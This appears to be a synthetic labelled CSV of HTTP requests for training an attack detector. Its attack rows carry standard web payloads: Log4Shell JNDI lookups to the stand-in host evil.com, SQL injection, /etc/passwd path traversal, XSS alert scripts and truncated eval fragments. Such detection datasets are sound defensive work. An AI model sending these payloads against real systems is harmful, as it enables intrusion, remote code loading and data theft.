request_method,url,payload,user_agent,response_code,is_attack
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page58,,sqlmap/1.0,200,0
GET,/app/page79,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page26?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page83,,sqlmap/1.0,200,0
GET,/app/page31,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page84?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page12?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page6?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page37?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page88,,Nikto/2.1.6,500,0
GET,/app/page93?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
OPTIONS,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page13,,Nikto/2.1.6,200,0
GET,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page94,,sqlmap/1.0,200,0
GET,/app/page50,,sqlmap/1.0,200,0
DELETE,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page66,,Nikto/2.1.6,200,0
POST,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page51,,Nikto/2.1.6,500,0
GET,/app/page88?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page1?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page55,,sqlmap/1.0,404,0
POST,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47,,sqlmap/1.0,200,0
GET,/app/page39?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
PUT,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page39,,sqlmap/1.0,200,0
GET,/app/page63,,Nikto/2.1.6,200,0
DELETE,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page18?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page73,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
POST,/app/page69?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
PUT,/app/page32,,Nikto/2.1.6,404,0
GET,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page40,,Nikto/2.1.6,200,0
POST,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page16?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page57?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page60,,Nikto/2.1.6,403,0
POST,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page3?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page50?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page89?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page93,,Nikto/2.1.6,200,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page26?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,500,1
PUT,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page23?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page75?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page74?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
POST,/app/page1?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page56,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page38?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
PUT,/app/page48?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
GET,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page72?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page83?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
PUT,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page30?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page59?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page68?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,500,1
OPTIONS,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page70?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page85?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,403,1
GET,/app/page58,,sqlmap/1.0,200,0
POST,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page63,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
DELETE,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page32?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
POST,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page15?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page24?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page51?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page59?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,500,1
POST,/app/page53?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page78?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page40?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page69?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,403,1
PUT,/app/page88?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page70?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,500,1
POST,/app/page98?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
PUT,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page69,,sqlmap/1.0,200,0
POST,/app/page26,,Nikto/2.1.6,200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page67?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
POST,/app/page78,,sqlmap/1.0,200,0
OPTIONS,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page10,,sqlmap/1.0,200,0
GET,/app/page26?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page50?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page35?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page90?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page85,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
PUT,/app/page30?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
POST,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page10?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page64?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page33,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page16,,Nikto/2.1.6,404,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page52?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
PUT,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
PUT,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page93?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page68,,sqlmap/1.0,500,0
OPTIONS,/app/page74,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page29?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page55,,Nikto/2.1.6,403,0
POST,/app/page52?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page22,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page99,,Nikto/2.1.6,200,0
PUT,/app/page67,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page16?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page82?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page19?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
OPTIONS,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page98,,sqlmap/1.0,200,0
GET,/app/page83?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page75?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page88,,Nikto/2.1.6,200,0
DELETE,/app/page5?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page62,,Nikto/2.1.6,200,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page39,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page63?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page21?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,403,1
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page61,,sqlmap/1.0,200,0
GET,/app/page62?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page31?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page80?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page99,,Nikto/2.1.6,200,0
GET,/app/page62?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page43,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page18,,Nikto/2.1.6,403,0
GET,/app/page68,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page95?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
OPTIONS,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page94,,sqlmap/1.0,200,0
POST,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page27?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page96?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
PUT,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4,,Nikto/2.1.6,200,0
PUT,/app/page14?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page10,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page99?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page84?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page21,,sqlmap/1.0,200,0
POST,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page53?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page95?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page96?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page81?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page34?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page18,,sqlmap/1.0,404,0
GET,/app/page28?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page93?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page90?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
POST,/app/page3?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,403,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page66?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page33?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page68?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page63,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page88,,Nikto/2.1.6,200,0
POST,/app/page45?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page5?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
